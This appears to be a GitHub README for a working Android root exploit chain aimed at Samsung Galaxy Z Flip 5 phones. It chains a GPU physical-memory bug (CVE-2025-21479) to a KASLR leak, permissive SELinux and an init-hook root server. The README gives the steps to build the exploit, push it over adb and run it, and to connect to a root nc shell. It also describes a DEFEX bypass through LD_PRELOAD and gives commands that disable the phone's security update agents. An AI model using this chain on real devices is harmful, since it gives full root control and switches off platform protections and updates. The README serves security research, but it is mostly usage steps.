# omae-wa-cheese-da

![Image](https://github.com/user-attachments/assets/8db2f80b-705c-415a-ba83-1c5ca7e16ed4)

GPU arbitrary physical R/W (CVE-2025-21479) -> KASLR leak -> SELinux permissive -> RKP-safe init-hook root server & DEFEX bypass custom binary exec (LD_PRELOAD)

It takes about 6 mins.. Be patient.

I'll optimize it later.

# Tested devices

- Galaxy Z Flip 5 (SM-F731N)
- Firmware: F731NKSU5EYD9
- Android: 15
- Security patch: 2025-04-01
- SoC: Snapdragon 8 Gen 2 (SM8550 / kalama)
- GPU: Adreno 740 v2

- Galaxy Z Flip 5 (SM-F7310) — thanks [@eoegamer](https://github.com/eoegamer) for testing & driving!!
- Firmware: F7310ZCS4CXH2
- Android: 14
- SoC: Snapdragon 8 Gen 2 (SM8550 / kalama)
- GPU: Adreno 740

# Requirements

- Security patch before August 2025
- Adreno A7xx GPU

# Patch check

Use the GPU firmware pattern:
```bash
xxd /vendor/firmware/a740_sqe.fw | grep -i "0300 422a"
```

If it matches, the firmware is vulnerable
```bash 
; vulnerable firmware (v675)
and $04, $12, 0x3

; patched firmware (v676)
and $04, $12, 0x7
```

# Build & usage

`exploit.c` is built for F731NKSU5EYD9. For other firmware, retarget it with `port_extract.py` first (see PORTING.md).

```bash
# build exploit.c with the Android NDK (aarch64), e.g.:
#   $NDK/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android34-clang exploit.c -o cheese
adb push cheese /data/local/tmp/
adb shell 'chmod +x /data/local/tmp/cheese; /data/local/tmp/cheese'
```

Run once per boot (the root server is not persistent). On success it leaves a root `toybox nc`
listener bound to loopback (127.0.0.1:4444). Get a root shell from `adb shell`:

```bash
adb shell
nc 127.0.0.1 4444          # root shell, uid=0  (u:r:sec_system_init_shell:s0)
```
  
Stock binaries can still run directly. The issue is that DEFEX blocks custom native binaries when executed directly.
So instead, run your custom code as an `LD_PRELOAD` library injected into a stock host process from the root shell:

```bash
LD_PRELOAD=/data/local/tmp/test.so /system/bin/toybox true
```

Build `test.so` with an `__attribute__((constructor))` entry; its constructor runs as root inside the stock host!

# Tips

- If it hangs for more than a 15 mins, reboot and let the device cool down.

- GPU spraying is probabilistic. Retry or reboot if it fails.

- Disable software updates 

    Disable:
    ```bash
    pm disable-user --user 0 com.sec.android.soagent
    pm disable-user --user 0 com.wssyncmldm
    ```

    Re-enable:
    ```bash 
    pm enable --user 0 com.sec.android.soagent
    pm enable --user 0 com.wssyncmldm
    ``` 

# Notes

For authorized security research and education only. The exact device and firmware must match.